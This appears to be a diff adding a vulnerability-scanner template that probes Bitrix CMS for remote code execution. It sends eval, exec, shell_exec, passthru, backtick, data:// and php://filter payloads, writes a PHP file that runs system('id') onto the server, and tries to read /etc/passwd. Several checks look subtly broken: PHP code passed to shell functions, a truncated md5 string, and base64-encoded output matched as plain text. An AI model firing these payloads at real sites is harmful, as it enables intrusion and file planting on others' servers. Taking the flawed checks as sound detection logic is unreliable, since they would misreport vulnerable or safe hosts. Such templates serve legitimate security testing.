@@ -1,0 +1,116 @@
+id: bitrix-rce-vulnerabilities
+
+info:
+  name: Bitrix Remote Code Execution Vulnerabilities
+  author: clevergod
+  severity: critical
+  description: |
+    Проверка различных RCE уязвимостей в Bitrix CMS через eval, system, exec и другие функции
+  tags: bitrix,rce,code-execution,critical
+
+requests:
+  # RCE через eval в компонентах
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      VOTE_ID=1&PARAMS=eval(base64_decode('ZWNobyBtZDUoMTIzNDU2Nzg5KTs='))
+    matchers:
+      - type: word
+        name: rce-eval
+        words:
+          - "25f9e794323b453885f5181f1b624d0"  # md5(123456789)
+
+  # RCE через system в html_editor_action
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=save_file&path=/upload/test.php&content=<?php system("id"); ?>
+    matchers:
+      - type: word
+        name: rce-system
+        words:
+          - "uid="
+          - "gid="
+
+  # RCE через exec в компонентах
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      FID=1&PARAMS=exec(base64_decode('ZWNobyBtZDUoMTIzNDU2Nzg5KTs='))
+    matchers:
+      - type: word
+        name: rce-exec
+        words:
+          - "25f9e794323b453885f5181f1b624d0"
+
+  # RCE через shell_exec
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/blog.post.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      BLOG_ID=1&PARAMS=shell_exec(base64_decode('ZWNobyBtZDUoMTIzNDU2Nzg5KTs='))
+    matchers:
+      - type: word
+        name: rce-shell-exec
+        words:
+          - "25f9e794323b453885f5181f1b624d0"
+
+  # RCE через passthru
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/catalog.section.list/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      IBLOCK_ID=1&PARAMS=passthru(base64_decode('ZWNobyBtZDUoMTIzNDU2Nzg5KTs='))
+    matchers:
+      - type: word
+        name: rce-passthru
+        words:
+          - "25f9e794323b453885f5181f1b624d0"
+
+  # RCE через backticks
+  - method: POST
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/sale.basket.basket/ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      PRODUCT_ID=1&PARAMS=`echo md5(123456789)`
+    matchers:
+      - type: word
+        name: rce-backticks
+        words:
+          - "25f9e794323b453885f5181f1b624d0"
+
+  # RCE через include с data:// wrapper
+  - method: GET
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php?VOTE_ID=1&PARAMS=data://text/plain;base64,PD9waHAgZWNobyBtZDUoMTIzNDU2Nzg5KTs/Pg=="
+    matchers:
+      - type: word
+        name: rce-data-wrapper
+        words:
+          - "25f9e794323b453885f5181f1b624d0"
+
+  # RCE через php://filter
+  - method: GET
+    path:
+      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php?FID=1&PARAMS=php://filter/convert.base64-encode/resource=/etc/passwd"
+    matchers:
+      - type: word
+        name: rce-php-filter
+        words:
+          - "root:"
+          - "daemon:" 
